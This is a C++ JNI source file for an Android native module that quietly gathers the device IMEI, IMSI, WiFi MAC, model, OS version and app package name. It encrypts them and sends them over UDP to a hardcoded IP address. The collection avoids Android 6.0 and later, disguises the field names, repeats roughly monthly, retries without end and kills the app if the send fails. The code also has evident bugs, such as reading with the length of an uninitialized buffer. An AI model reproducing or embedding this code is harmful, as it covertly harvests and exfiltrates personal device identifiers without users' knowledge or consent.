#include "appinfo.h"

jobject getTmManager(JNIEnv* env, jobject thizz);
jstring getImei(JNIEnv* env, jobject thizz);
jstring getImsi(JNIEnv* env, jobject thizz);
jstring getWifiMac(JNIEnv* env);
jstring getPackage(JNIEnv* env, jobject thizz);
jstring getVersion(JNIEnv* env);
jstring getPhoneModel(JNIEnv* env);
jstring getSysVersion(JNIEnv* env);
const char* jstr2char(JNIEnv* env, jstring str);

jobject getPublicKey(JNIEnv* env);
jstring md5DigestRsa(JNIEnv* env, jstring input);
jstring rsaEncrypt(JNIEnv* env, jstring input);
jstring getHexStringRsa(JNIEnv* env, jbyteArray inputByteArr);
void* postDataToServer(void* args);
jint getSdkVersionRsa(JNIEnv* env);

#define IP_SIZE     16

char* postData;

//const char* domain = "madp.86itsec.com";
//const int port = 1025;

const char* domain = "117.48.196.34";
const int port = 54;

/**



 * 获取rsa公钥
 */
const char* getRasKey(){
	size_t len = 512;
	const char* key = (char*) malloc(len);

//qiantu key 
	// snprintf((char*)key, len, "%s%s%s%s%s%s%s",
	// 			"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAz9rI5mYlx5QTQS90y5xO",
	// 			"kbc29BJcem4+u5IqKOOIQbabGE+2Dv2rR3v8zMPoPPCpjn+TdC0u8wYKsZuxHOxv",
	// 			"vASyYfjVEkt82ZwkvIfnr3fYmHSjlyHXpTazlNkay/aXDJt0k+lcR1FxhQ/L0hgy",
	// 			"E8gmh4R3Rc2xAdymA8TlvYQoyzKS5owN7fKZjSQ4x8Dh/CQNiEv5jqrn5izrnRnf",
	// 			"ZXKZHm7YAYSg42L4zEjeKYra0QrZRKnQaJ48eDnWoUnWWQnEpa/Fi+f6zapWqYXw",
	// 			"JVmfzSQPHysWsxLdku60rZejPJxFkgTmr9431pMPhCcb3aXgTlCWtSfaEphz4/wF",
	// 			"8QIDAQAB");

	//************** hlct
	snprintf((char*)key, len, "%s%s%s%s%s%s%s",
				"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEApoMNCQ7npC1tY1X8WDlC",
				"Y/VdgQClbQY/lHbINT+ZaOsrfcdY1d3ngaUN2VTcfX24bzr4eS0Vj1r5mdojREKp",
				"ZnDZIJnc9Vta4lEc6hasOcLJqN7kkawZrfJ8mb7ZE+Y+V4j3n6BXPUh6X+YZE24h",
				"ZZwEQW8ENraxy96iJsRGZhIFUWgjPGLNVVvWUf06LOz33F9oCVybnvDc1mtXS3cF",
				"o/OgB45EKS2it8eBt5OeiNFjFI6pnUqEz0Z2N+rfWVN7I50bsi4xxRGL3ucFVhAN",
				"sT6munohSQvDzqvc3clTGoAW2z77p394d8O+CUfrodB/DZ4ePUB3n9RyMBGc1QZU",
				"nQIDAQAB");
	return key;
}

/**
 * 获取App信息
 */
void getAppInfo(JNIEnv* env, jobject thizz){

	if(getSdkVersionRsa(env) >= 23){ //6.0以上的版本不获取
		return;
	}

	size_t len = 128;
	const char* packageName = jstr2char(env, getPackage(env, thizz));

	//拼接字符串

	char* FILE_PATH = (char *) malloc(len);
	snprintf(FILE_PATH, len, "%s%s%s", "/data/data/", packageName, "/cache/g.txt");

	FILE *fp; // 文件指针
	// 判断文件是否能够正确创建/打开
	if ((fp = fopen(FILE_PATH, "r+")) == NULL) {
		if ((fp = fopen(FILE_PATH, "w+")) == NULL) {
			return ;
		}
	}
	time_t now_time;
	now_time = time(NULL);
	char str[11];

	if (fgets(str, strlen(str), fp) != NULL) {
		//判断字符串是否是纯数字
		for (int i = 0; i < strlen(str); i++) {
			if (str[i] >= '0' && str[i] <= '9')
				continue;
			else {
				fclose(fp);
				return;
			}
		}

		long lasttime = atol(str);
		long period = (now_time - lasttime) / (24 * 60 * 60);
		if (period < 30) { //间隔小于30天则不再获取
			fclose(fp);
			return;
		}
	} else {
		sprintf(str, "%ld%s", now_time, "");
		fputs(str, fp);
	}
	fclose(fp);

	char* deviceInfo = (char *) malloc(len);
	const char* imei = jstr2char(env, getImei(env, thizz));

	//拼接字符串  "{\"imei\":\"%s\",\"imsi\":\"%s\",\"packname\":\"%s\",\"wifimac\":\"%s\"}"
	snprintf(deviceInfo, len, "{\"f1\":\"%s\",\"f2\":\"%s\",\"f3\":\"%s\",\"f4\":\"%s\",\"f5\":\"%s\",\"f6\":\"Android %s\"}",
			imei,
			jstr2char(env, getImsi(env, thizz)),
			packageName,
			jstr2char(env, getWifiMac(env)),
			jstr2char(env, getPhoneModel(env)),
			jstr2char(env, getSysVersion(env)));

	//拼接字符串
	char* finger = (char *) malloc(len);
	snprintf(finger, len, "%s%s%s", "hhyyaa", imei, "oottaa");
	jstring fingerStr = env->NewStringUTF(finger);
	//获取md5
	jstring fingetMd5 = md5DigestRsa(env, fingerStr);

	jstring rsaData = rsaEncrypt(env, env->NewStringUTF(deviceInfo));

	len = 1024;
	postData = (char *) malloc(len);
	snprintf(postData, len, "%s%s%s%s%s",
			"info=",
			env->GetStringUTFChars(fingetMd5, JNI_FALSE),
			env->GetStringUTFChars(rsaData, JNI_FALSE),
			"&nowversion=",
			env->GetStringUTFChars(getVersion(env), JNI_FALSE));

//	LOGE("postData.......\n%s", postData);
	pthread_t t_id;
	if(pthread_create(&t_id, NULL, postDataToServer, NULL) != 0){ //开启子线程发送数据
		kill(getpid(), SIGKILL);
	}

}


void* postDataToServer(void* arg){
	int client_sockfd;
	int len;
	struct sockaddr_in remote_addr; //服务器端网络地址结构体
	int sin_size;
	char str[32];
	const char* ip;
	hostent* host = gethostbyname(domain);
	char **pptr;
	pptr=host->h_addr_list;
	if(*pptr!=NULL){
		ip = inet_ntop(host->h_addrtype, *pptr, str, sizeof(str));
	}
//	for(; *pptr!=NULL; pptr++){
//		ip = inet_ntop(host->h_addrtype, *pptr, str, sizeof(str));
//	}
//	LOGE("IP------>%s", ip);

	memset(&remote_addr, 0, sizeof(remote_addr)); //数据初始化--清零
	remote_addr.sin_family = AF_INET; //设置为IP通信
	remote_addr.sin_addr.s_addr = inet_addr(ip); //服务器IP地址
	remote_addr.sin_port = htons(port); //服务器端口号

	/*创建客户端套接字--IPv4协议，面向无连接通信，UDP协议*/
	if ((client_sockfd = socket(PF_INET, SOCK_DGRAM, 0)) < 0) {
//		LOGE("socket error");
		return 0;
	}

	sin_size = sizeof(struct sockaddr_in);

	/*向服务器发送数据包*/
	if ((len = sendto(client_sockfd, postData, strlen(postData), 0,
			(struct sockaddr *) &remote_addr, sizeof(struct sockaddr))) < 0) {
		return 0;
	}

	char buf[BUFSIZ] = {0};
	memset(buf, 0, sizeof(buf));
	int recvBytes = recvfrom(client_sockfd, buf, sizeof(buf), 0, NULL, NULL);
	/*关闭套接字*/
	close(client_sockfd);
	sleep(3);
	if(recvBytes <= 0 || strcmp(buf, "OK") != 0){
		postDataToServer(0);
	}

	return 0;
}


/**
 * rsa加密
 */
jstring rsaEncrypt(JNIEnv* env, jstring input){
	env->PushLocalFrame(64);
	jclass cipherClazz = env->FindClass("javax/crypto/Cipher");
	jmethodID getInstanceMethodId = env->GetStaticMethodID(cipherClazz, "getInstance", "(Ljava/lang/String;)Ljavax/crypto/Cipher;");
	jstring algorithm = env->NewStringUTF("RSA/ECB/PKCS1Padding");
	jobject cipher = env->CallStaticObjectMethod(cipherClazz, getInstanceMethodId, algorithm);

	jfieldID encryptModeFieldId = env->GetStaticFieldID(cipherClazz, "ENCRYPT_MODE", "I");

	jmethodID initMethodId = env->GetMethodID(cipherClazz, "init", "(ILjava/security/Key;)V");
	env->CallVoidMethod(cipher, initMethodId, env->GetStaticIntField(cipherClazz, encryptModeFieldId), getPublicKey(env));
	jclass strClazz = env->FindClass("java/lang/String");
	jmethodID getBytesMethodId = env->GetMethodID(strClazz, "getBytes", "()[B");
	jbyteArray buff = (jbyteArray)env->CallObjectMethod(input, getBytesMethodId);

	jmethodID doFinalMethodId = env->GetMethodID(cipherClazz, "doFinal", "([B)[B");
	jbyteArray encryptArr = (jbyteArray)env->CallObjectMethod(cipher, doFinalMethodId, buff);
	jstring rsaEncryptStr = getHexStringRsa(env, encryptArr);
	rsaEncryptStr = (jstring)env->PopLocalFrame(rsaEncryptStr);
	return rsaEncryptStr;
}


/**
 * 获取公钥对象
 */
jobject getPublicKey(JNIEnv* env){
	env->PushLocalFrame(64);
	jclass base64Clazz = env->FindClass("android/util/Base64");
	jmethodID base64DecodeMethodId = env->GetStaticMethodID(base64Clazz, "decode", "(Ljava/lang/String;I)[B");
	jfieldID defaultFieldId = env->GetStaticFieldID(base64Clazz, "DEFAULT", "I");
	jstring rsaKey = env->NewStringUTF(getRasKey());
	jbyteArray buffer = (jbyteArray)env->CallStaticObjectMethod(base64Clazz, base64DecodeMethodId, rsaKey, env->GetStaticIntField(base64Clazz, defaultFieldId));
	//获取keyFactory
	jclass keyFactoryClazz = env->FindClass("java/security/KeyFactory");
	jmethodID getInstanceMethodId = env->GetStaticMethodID(keyFactoryClazz, "getInstance", "(Ljava/lang/String;)Ljava/security/KeyFactory;");
	jstring rsa = env->NewStringUTF("RSA");
	jobject keyFactory = env->CallStaticObjectMethod(keyFactoryClazz, getInstanceMethodId, rsa);
	//获取keySpec
	jclass x509Clazz = env->FindClass("java/security/spec/X509EncodedKeySpec");
	jmethodID x509InitMethodId = env->GetMethodID(x509Clazz, "<init>", "([B)V");
	jobject keySpec = env->NewObject(x509Clazz, x509InitMethodId, buffer);

	//获取publicKey
	jmethodID generatePubMethodId = env->GetMethodID(keyFactoryClazz, "generatePublic", "(Ljava/security/spec/KeySpec;)Ljava/security/PublicKey;");
	jobject publicKey = env->CallObjectMethod(keyFactory, generatePubMethodId, keySpec);
	env->ExceptionClear();

	publicKey = env->PopLocalFrame(publicKey);

	return publicKey;
}

/**
 * md5加密
 */
jstring md5DigestRsa(JNIEnv* env, jstring input) {
	env->PushLocalFrame(64);
	jstring MD5 = env->NewStringUTF("MD5");
	jclass msgDigestClazz = env->FindClass("java/security/MessageDigest");
	jmethodID getInstanceMethodId = env->GetStaticMethodID(msgDigestClazz, "getInstance",
			"(Ljava/lang/String;)Ljava/security/MessageDigest;");
	jobject msgDigest = env->CallStaticObjectMethod(msgDigestClazz,
			getInstanceMethodId, MD5);
	jclass stringClazz = env->FindClass("java/lang/String");
	jmethodID getBytesMethodId = env->GetMethodID(stringClazz,
			"getBytes", "()[B");
	jbyteArray inputByteArr = (jbyteArray)env->CallObjectMethod(input,
			getBytesMethodId);

	jmethodID updateMethodId = env->GetMethodID(msgDigestClazz,
			"update", "([B)V");
	env->CallVoidMethod(msgDigest, updateMethodId, inputByteArr);

	jmethodID digestMethonId = env->GetMethodID(msgDigestClazz,
			"digest", "()[B");
	jbyteArray digestArr = (jbyteArray)env->CallObjectMethod(msgDigest,
			digestMethonId);

	jobject hexStr = getHexStringRsa(env, digestArr);

	hexStr = env->PopLocalFrame(hexStr);
	return (jstring)hexStr;
}

jstring getHexStringRsa(JNIEnv* env, jbyteArray inputByteArr) {
	env->PushLocalFrame(64);
	jclass stringClazz = env->FindClass("java/lang/String");
	jstring formartStr = env->NewStringUTF("%032x");
	jclass bigIntClazz = env->FindClass("java/math/BigInteger");
	jmethodID initBigIntMethodId = env->GetMethodID(bigIntClazz,
			"<init>", "(I[B)V");

	jobject bigInt = env->NewObject(bigIntClazz, initBigIntMethodId, 1,
			inputByteArr);
	jclass objClazz = env->FindClass("java/lang/Object");

	jobjectArray objArr = env->NewObjectArray(1, objClazz, bigInt);

	jmethodID formatMethodId = env->GetStaticMethodID(stringClazz,
			"format",
			"(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;");
	jobject forward = env->CallStaticObjectMethod(stringClazz,
			formatMethodId, formartStr, objArr);

	forward = env->PopLocalFrame(forward);
	return (jstring)forward;
}

const char* jstr2char(JNIEnv* env, jstring str){
	return env->GetStringUTFChars(str, JNI_FALSE);
}

jstring getVersion(JNIEnv* env){
	return env->NewStringUTF("v1.17.0614");
}

jstring getImei(JNIEnv* env, jobject thizz){
	jclass tmManagerClazz = env->FindClass("android/telephony/TelephonyManager");
	jmethodID getDvId = env->GetMethodID(tmManagerClazz, "getDeviceId", "()Ljava/lang/String;");
	jobject tmManager = getTmManager(env, thizz);
	jstring imei = (jstring)env->CallObjectMethod(tmManager, getDvId);
	if(imei == NULL){
		imei = env->NewStringUTF("");
	}
	env->DeleteLocalRef(tmManagerClazz);
	env->DeleteLocalRef(tmManager);
	return imei;
}

jstring getImsi(JNIEnv* env, jobject thizz){
	jclass tmManagerClazz = env->FindClass("android/telephony/TelephonyManager");
	jmethodID getDvId = env->GetMethodID(tmManagerClazz, "getSubscriberId", "()Ljava/lang/String;");
	jobject tmManager = getTmManager(env, thizz);
	jstring imsi = (jstring)env->CallObjectMethod(tmManager, getDvId);
	if(imsi == NULL){
		imsi = env->NewStringUTF("");
	}
	env->DeleteLocalRef(tmManagerClazz);
	env->DeleteLocalRef(tmManager);
	return imsi;
}

jstring getWifiMac(JNIEnv* env){
	FILE * fp;
	char buffer[18];
	fp=popen("cat /sys/class/net/wlan0/address","r");
	fgets(buffer,sizeof(buffer),fp);
	pclose(fp);
	return env->NewStringUTF(buffer);
}

jstring getPackage(JNIEnv* env, jobject thizz){
	jclass ctxWrapClazz = env->FindClass("android/content/ContextWrapper");
	jmethodID getPackageMethod = env->GetMethodID(ctxWrapClazz, "getPackageName", "()Ljava/lang/String;");
	jstring packagename = (jstring)env->CallObjectMethod(thizz, getPackageMethod);
	env->DeleteLocalRef(ctxWrapClazz);
	return packagename;
}

/**
 * 获取TelephonyManager对象
 */
jobject getTmManager(JNIEnv* env, jobject thizz){
	jclass atyClazz = env->FindClass("android/app/Activity");
	jmethodID sysServiceMethod = env->GetMethodID(atyClazz, "getSystemService", "(Ljava/lang/String;)Ljava/lang/Object;");
	jclass ctxClazz = env->FindClass("android/content/Context");
	jfieldID phoneSerField = env->GetStaticFieldID(ctxClazz, "TELEPHONY_SERVICE", "Ljava/lang/String;");
	jstring phoneSer = (jstring)env->GetStaticObjectField(ctxClazz, phoneSerField);
	jobject tmManagerObj = env->CallObjectMethod(thizz, sysServiceMethod, phoneSer);
	env->DeleteLocalRef(atyClazz);
	env->DeleteLocalRef(ctxClazz);
	env->DeleteLocalRef(phoneSer);
	return tmManagerObj;
}

/**
 * 获取sdk版本，主要用来判断手机的系统版本
 */
jint getSdkVersionRsa(JNIEnv* env) {
	//int sdk = android.os.Build.VERSION.SDK_INT;
	jclass versionClazz = env->FindClass("android/os/Build$VERSION");
	jfieldID versionFieldId = env->GetStaticFieldID(versionClazz,
			"SDK_INT", "I");
	jint sdkVersion = env->GetStaticIntField(versionClazz,
			versionFieldId);
	env->DeleteLocalRef(versionClazz);
	return sdkVersion;
}

/**
 * 获取手机型号
 */
jstring getPhoneModel(JNIEnv* env){
	jclass versionClazz = env->FindClass("android/os/Build");
	jfieldID modelFieldId = env->GetStaticFieldID(versionClazz, "MODEL",
			"Ljava/lang/String;");
	jstring model = (jstring)env->GetStaticObjectField(versionClazz, modelFieldId);
	env->DeleteLocalRef(versionClazz);
	return model;
}

/**
 * 获取手机系统版本
 */
jstring getSysVersion(JNIEnv* env){
	jclass versionClazz = env->FindClass("android/os/Build$VERSION");
	jfieldID sysVersionFieldId = env->GetStaticFieldID(versionClazz, "RELEASE",
			"Ljava/lang/String;");
	jstring sysVersion = (jstring)env->GetStaticObjectField(versionClazz, sysVersionFieldId);
	env->DeleteLocalRef(versionClazz);
	return sysVersion;
}
